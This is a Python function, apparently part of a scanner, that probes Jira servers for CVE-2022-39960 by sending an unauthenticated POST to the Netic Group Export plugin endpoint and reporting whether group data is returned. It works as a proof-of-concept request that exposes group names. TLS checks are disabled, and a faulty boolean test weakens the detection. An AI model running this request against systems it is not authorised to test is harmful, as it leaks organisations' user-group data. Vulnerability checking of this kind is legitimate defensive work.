import requests
from colorama import Fore, Style

def check_cve_2022_39960(base_url):
    """
    Checks for the Netic Group Export vulnerability  CVE-2022-39960 by sending a POST request 
    to the /plugins/servlet/groupexportforjira/admin/json endpoint and analyzing the response.
    """
    print(f"\n{Fore.YELLOW}INFO: IN-DEVELOPMENT Checking for CVE-2022-39960 Netic Group Export Vulnerability{Style.RESET_ALL}")

    vulnerabilities = []
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Atlassian-Token': 'no-check'
    }
    payload = "groupexport_searchstring=&groupexport_download=true"
    group_export_url = f"{base_url.rstrip('/')}/plugins/servlet/groupexportforjira/admin/json"

    try:
        print(f"{Fore.BLUE}[Testing URL]{Style.RESET_ALL}: {group_export_url}")
        response = requests.post(group_export_url, headers=headers, data=payload, allow_redirects=False, verify=False)

        if response.status_code == 200:
            if '"jiraGroupObjects"' and '"groupName"' in response.text:
                vulnerabilities.append(f"+ [CVE-2022-39960 Vulnerability] Unauthenticated group export found: {group_export_url}")
                print(f"{Fore.GREEN}+ CVE-2022-39960 Vulnerability found: Unauthenticated group export available at {group_export_url}{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}- INSPECT No vulnerability detected, but received HTTP 200.{Style.RESET_ALL}")
        elif response.status_code == 403:
            print(f"{Fore.YELLOW}- Access Forbidden (403): {group_export_url}{Style.RESET_ALL}")
        elif response.status_code == 302:
            location = response.headers.get("Location", "No Location header found")
            print(f"{Fore.YELLOW}- Redirected (302): {group_export_url}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}- Location Header: {location}{Style.RESET_ALL}")
        elif response.status_code == 404:
            print(f"{Fore.YELLOW}- Not Found (404): {group_export_url}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}- HTTP Code {response.status_code} for: {group_export_url}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}* An error occurred while checking {group_export_url}: {e}{Style.RESET_ALL}")

    return vulnerabilities  # Return the discovered vulnerabilities
